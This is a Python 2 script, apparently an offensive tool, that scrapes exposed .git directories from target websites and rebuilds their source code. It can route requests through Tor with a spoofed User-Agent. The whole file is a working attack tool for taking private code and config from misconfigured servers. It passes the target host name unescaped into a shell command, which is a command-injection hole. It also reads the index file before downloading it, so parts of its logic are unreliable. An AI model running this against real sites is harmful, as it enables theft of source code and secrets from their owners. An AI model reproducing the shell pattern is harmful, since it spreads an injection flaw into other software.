#!/usr/bin/python
#
# source code dumper from .git folder
#
import struct, mmap, binascii, collections, sys, os, re
import requests
from gevent import monkey
from gevent.lock import BoundedSemaphore
from gevent.pool import Pool
monkey.patch_all()

import time
import shutil
from functools import wraps
import traceback
import argparse
import subprocess, threading

__author__ = 'c4'


use_tor = None
request_timeout = 60

def index_read(f, format):
	format = "! " + format
	bytes = f.read(struct.calcsize(format))
	return struct.unpack(format, bytes)[0]

def retry(ExceptionToCheck, tries=4, delay=3, backoff=2, logger=None):
	"""Retry calling the decorated function using an exponential backoff.

	http://www.saltycrane.com/blog/2009/11/trying-out-retry-decorator-python/
	original from: http://wiki.python.org/moin/PythonDecoratorLibrary#Retry

	:param ExceptionToCheck: the exception to check. may be a tuple of
		exceptions to check
	:type ExceptionToCheck: Exception or tuple
	:param tries: number of times to try (not retry) before giving up
	:type tries: int
	:param delay: initial delay between retries in seconds
	:type delay: int
	:param backoff: backoff multiplier e.g. value of 2 will double the delay
		each retry
	:type backoff: int
	:param logger: logger to use. If None, print
	:type logger: logging.Logger instance
	"""
	def deco_retry(f):
		@wraps(f)
		def f_retry(*args, **kwargs):
			mtries, mdelay = tries, delay
			while mtries > 1:
				try:
					return f(*args, **kwargs)
				except ExceptionToCheck, e:
					msg = "func: '{}' > exc: {}, Retrying in {} seconds...".format(str(f.__name__), str(e), mdelay)
					if logger:
						logger.warning(msg)
					else:
						print msg
					time.sleep(mdelay)
					mtries -= 1
					mdelay *= backoff
			return f(*args, **kwargs)
		return f_retry	# true decorator
	return deco_retry

class CommandRunner(object):
	def __init__(self, cmd):
		self.cmd = cmd
		self.process = None

	@retry(Exception, tries=2)
	def run(self, timeout):
		def target():
			self.process = subprocess.Popen(self.cmd, shell=True)
			self.process.communicate()
			print 'Thread finished'
		thread = threading.Thread(target=target)
		thread.start()
		thread.join(timeout)
		if thread.is_alive():
			print 'Terminating process'
			self.process.terminate()
			thread.join()
		print "subprocess.ret_code: {}".format(self.process.returncode)


@retry(Exception, tries=3)
def download_git_object(download_url, use_tor=None, raw=None):
	session = requests.session()
	session.proxies = {}
	if use_tor:
		session.proxies['http'] = 'socks4://127.0.0.1:9050'
		session.proxies['https'] = 'socks4://127.0.0.1:9050'
	headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1)"
								 " AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"
								 "39.0.2171.95 Safari/537.36"}
	try:
		r = session.get(download_url,
							headers=headers,
							stream=True,
							allow_redirects=True,
							timeout=request_timeout)
		if r.status_code == 200:
			r.raw.decode_content = True
			if raw:
				return r.raw
			return r.content
		elif r.status_code == 404:
			print "[{}] {}".format(r.status_code, download_url)
		elif r.status_code == 403:
			# print "[{}] {}".format(r.status_code, download_url)
			print "soooqa!!! {}".format(download_url)
		else:
			print "[{}] {}".format(r.status_code, download_url)
	except Exception as e:
		raise(Exception)

def judge(download_url, out_folder, filename, use_tor=None):
	print download_url
	try:
		file = download_git_object(download_url, use_tor)
	except Exception as e:
		print "{} > {} : error: {}".format('[-]', filename, str(e))
		file = None
	if file:
		try:
			gitdir = out_folder + "/.git/" + "/".join(download_url.split(".git")[1].split('/')[:-1])
			if(not os.path.isdir(gitdir)):
				os.makedirs(gitdir)
			to_file = open(out_folder + "/.git/" + "/".join(download_url.split(".git")[1].split('/')), 'w+')
			file_body = file
			to_file.write(file_body)
		except Exception as e:
			pass
		# plain file
		dir = os.path.dirname(filename)
		if(not os.path.isdir(dir)):
			os.makedirs(dir)
		to_file = open(filename, 'w+')
		file_body = re.sub(r"blob [0-9]{0,}\0", "", file)
		to_file.write(file_body.lstrip("\0"))
		print "{} > {}".format('[+]', filename)
		to_file.close()


def main():
	parser = argparse.ArgumentParser(description='Git downloader script by <'+ __author__ + '>')
	parser.add_argument('--url', '-u', dest='url', default=None,
						help='url to get git repo"')
	parser.add_argument('-t', '--threads', dest='threads', default=20, help='threads to run')
	parser.add_argument('--tor', dest='tor', action='store_true', help="run script over tor")
	parser.add_argument('--output', '-o', dest='output', default=None, help='output dir with found results')
	parser.add_argument('--timeout', dest='timeout', default=request_timeout, help='set request timeouts')

	# Parse command line
	args = parser.parse_args()

	url = args.url
	thread_num = int(args.threads)
	output_directory = args.output
	use_tor = args.tor

	# exists case-sensitive URL
	url = url[:5].lower() + url[5:]
	if not url or re.match(r"^https?://", url) == None:
		print("Example: python {} -u http://site.com".format(sys.argv[0]))
		sys.exit()

	index_url = "{}/.git/index".format(url)
	host = url.split('://')[1].split('/')[0]

	if output_directory:
		output_directory = output_directory + "/" + host
	else:
		output_directory = "./" + host

	try:
		index_dl = download_git_object(index_url, use_tor, 1)
	except Exception as e:
		index_dl = None

	path_index = output_directory + "/.git/index"
	try:
		index_file = open(path_index, 'rb')
	except Exception as e:
		print "[-] {} : {}".format(index_file, str(e))

	dl_addon_files = ['HEAD', 'objects/info/packs', 'description', 'config', 'COMMIT_EDITMSG', 'index', 'packed-refs', 'refs/heads/master', 'refs/remotes/origin/HEAD', 'refs/stash', 'logs/HEAD', 'logs/refs/heads/master', 'logs/refs/remotes/origin/HEAD', 'info/refs', 'info/exclude']

	for dl_file in dl_addon_files:
		dl_url = url+ "/.git/"+ dl_file
		dl = download_git_object(dl_url, use_tor, 1)
		dl_path = output_directory + "/.git/" + "/".join(dl_file.split('/')[:-1])
		path_dl_file = output_directory + "/.git/" + dl_file
		if(not os.path.isdir(dl_path)):
			os.makedirs(dl_path)
		if dl != None:
			try:
				with open(path_dl_file , 'wb') as f:
					shutil.copyfileobj(dl, f)
			except Exception as e:
				print "[-] {}: {}".format(dl_file, str(e))
			print "[+] {}".format(dl_file)

		else:
			print "[-] {}".format(dl_file)

	f = mmap.mmap(index_file.fileno(), 0, access=1)
	index = collections.OrderedDict()
	index["signature"] = f.read(4).decode("ascii")
	index["version"] = index_read(f, "I")
	index["entries"] = index_read(f, "I")

	pool = Pool(thread_num)

	for n in range(index["entries"]):
		entry = collections.OrderedDict()
		entry["entry"] = n + 1
		nuls = f.read(40)
		entry["sha1"] = binascii.hexlify(f.read(20)).decode("ascii")
		entry["flags"] = index_read(f, "H")
		stage_one = bool(entry["flags"] & (0b00100000 << 8))
		stage_two = bool(entry["flags"] & (0b00010000 << 8))
		entry["stage"] = stage_one, stage_two
		try:
			namelen = entry["flags"] & 0xFFF
		except Exception as e:
			print "bad name length: {}".format(str(e))
			# next iteration, pls
			continue
		entrylen = 62
		if namelen < 0xFFF:
			entry["name"] = f.read(namelen).decode("utf-8", "replace")
			entrylen += namelen
		else:
			name = []
			while True:
				byte = f.read(1)
				if byte == "\x00":
					break
				name.append(byte)
			entry["name"] = b"".join(name).decode("utf-8", "replace")
			entrylen += 1
		padlen = (8 - (entrylen % 8)) or 8
		nuls = f.read(padlen)
		download_url = "{}/.git/objects/{}/{}".format(url, entry["sha1"][:2], entry["sha1"][2:])
		filename = "{}/{}".format(output_directory, entry["name"].encode('ascii','ignore'))
		pool.spawn(judge, download_url, output_directory, filename, use_tor)
	pool.join()

	#
	# make all paths from exist information from git index file
	# need for next target analysis
	#
	cmd = "cd {} && git checkout -- .".format(output_directory)

	command = CommandRunner(cmd)
	command.run(360) # 360 seconds timeout before process will be stopped


if __name__ == "__main__":
	main()
